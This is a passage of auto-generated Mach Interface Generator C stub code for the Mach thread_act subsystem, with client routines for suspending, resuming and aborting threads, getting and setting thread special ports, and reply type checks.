	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_suspend_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_suspend_t__defined */

	__DeclareSendRpc(3605, "thread_suspend")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_act;
	InP->Head.msgh_id = 3605;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3605, "thread_suspend")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3605, "thread_suspend")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_suspend_t__defined)
	check_result = __MIG_check__Reply__thread_suspend_t((__Reply__thread_suspend_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_suspend_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_resume_t__defined)
#define __MIG_check__Reply__thread_resume_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_resume_t(__Reply__thread_resume_t *Out0P)
{

	typedef __Reply__thread_resume_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3706) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__thread_resume_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_resume */
mig_external kern_return_t thread_resume
(
	thread_read_t target_act
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_resume_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_resume_t__defined */

	__DeclareSendRpc(3606, "thread_resume")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_act;
	InP->Head.msgh_id = 3606;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3606, "thread_resume")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3606, "thread_resume")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_resume_t__defined)
	check_result = __MIG_check__Reply__thread_resume_t((__Reply__thread_resume_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_resume_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_abort_t__defined)
#define __MIG_check__Reply__thread_abort_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_abort_t(__Reply__thread_abort_t *Out0P)
{

	typedef __Reply__thread_abort_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3707) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__thread_abort_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_abort */
mig_external kern_return_t thread_abort
(
	thread_act_t target_act
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_abort_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_abort_t__defined */

	__DeclareSendRpc(3607, "thread_abort")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_act;
	InP->Head.msgh_id = 3607;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3607, "thread_abort")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3607, "thread_abort")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_abort_t__defined)
	check_result = __MIG_check__Reply__thread_abort_t((__Reply__thread_abort_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_abort_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_abort_safely_t__defined)
#define __MIG_check__Reply__thread_abort_safely_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_abort_safely_t(__Reply__thread_abort_safely_t *Out0P)
{

	typedef __Reply__thread_abort_safely_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3708) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__thread_abort_safely_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_abort_safely */
mig_external kern_return_t thread_abort_safely
(
	thread_act_t target_act
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_abort_safely_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_abort_safely_t__defined */

	__DeclareSendRpc(3608, "thread_abort_safely")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_act;
	InP->Head.msgh_id = 3608;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3608, "thread_abort_safely")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3608, "thread_abort_safely")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_abort_safely_t__defined)
	check_result = __MIG_check__Reply__thread_abort_safely_t((__Reply__thread_abort_safely_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_abort_safely_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_depress_abort_t__defined)
#define __MIG_check__Reply__thread_depress_abort_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_depress_abort_t(__Reply__thread_depress_abort_t *Out0P)
{

	typedef __Reply__thread_depress_abort_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3709) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__thread_depress_abort_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_depress_abort */
mig_external kern_return_t thread_depress_abort
(
	thread_act_t thread
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_depress_abort_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_depress_abort_t__defined */

	__DeclareSendRpc(3609, "thread_depress_abort")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thread;
	InP->Head.msgh_id = 3609;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3609, "thread_depress_abort")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3609, "thread_depress_abort")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_depress_abort_t__defined)
	check_result = __MIG_check__Reply__thread_depress_abort_t((__Reply__thread_depress_abort_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_depress_abort_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_get_special_port_t__defined)
#define __MIG_check__Reply__thread_get_special_port_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_get_special_port_t(__Reply__thread_get_special_port_t *Out0P)
{

	typedef __Reply__thread_get_special_port_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3710) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->special_port.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->special_port.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__thread_get_special_port_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_get_special_port */
mig_external kern_return_t thread_get_special_port
(
	thread_inspect_t thr_act,
	int which_port,
	mach_port_t *special_port
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int which_port;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t special_port;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t special_port;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_get_special_port_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_get_special_port_t__defined */

	__DeclareSendRpc(3610, "thread_get_special_port")

	InP->NDR = NDR_record;

	InP->which_port = which_port;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thr_act;
	InP->Head.msgh_id = 3610;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3610, "thread_get_special_port")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3610, "thread_get_special_port")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_get_special_port_t__defined)
	check_result = __MIG_check__Reply__thread_get_special_port_t((__Reply__thread_get_special_port_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_get_special_port_t__defined) */

	*special_port = Out0P->special_port.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_set_special_port_t__defined)
#define __MIG_check__Reply__thread_set_special_port_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_set_special_port_t(__Reply__thread_set_special_port_t *Out0P)
{

	typedef __Reply__thread_set_special_port_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3711) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__thread_set_special_port_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_set_special_port */
mig_external kern_return_t thread_set_special_port
(
	thread_act_t thr_act,
	int which_port,
	mach_port_t special_port
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t special_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		int which_port;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_set_special_port_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_set_special_port_t__defined */

	__DeclareSendRpc(3611, "thread_set_special_port")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t special_portTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->special_port = special_portTemplate;
	InP->special_port.name = special_port;
#else	/* UseStaticTemplates */
	InP->special_port.name = special_port;
	InP->special_port.disposition = 19;
	InP->special_port.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->which_port = which_port;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thr_act;
	InP->Head.msgh_id = 3611;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3611, "thread_set_special_port")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3611, "thread_set_special_port")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_set_special_port_t__defined)
	check_result = __MIG_check__Reply__thread_set_special_port_t((__Reply__thread_set_special_port_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_set_special_port_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_info_t__defined)
#define __MIG_check__Reply__thread_info_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_info_t(__Reply__thread_info_t *Out0P)
{

	typedef __Reply__thread_info_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */

	if (Out0P->Head.msgh_id != 3712) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 128)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if ( Out0P->thread_info_outCnt > 32 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 128)) / 4< Out0P->thread_info_outCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 128) + Out0P->thread_info_outCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

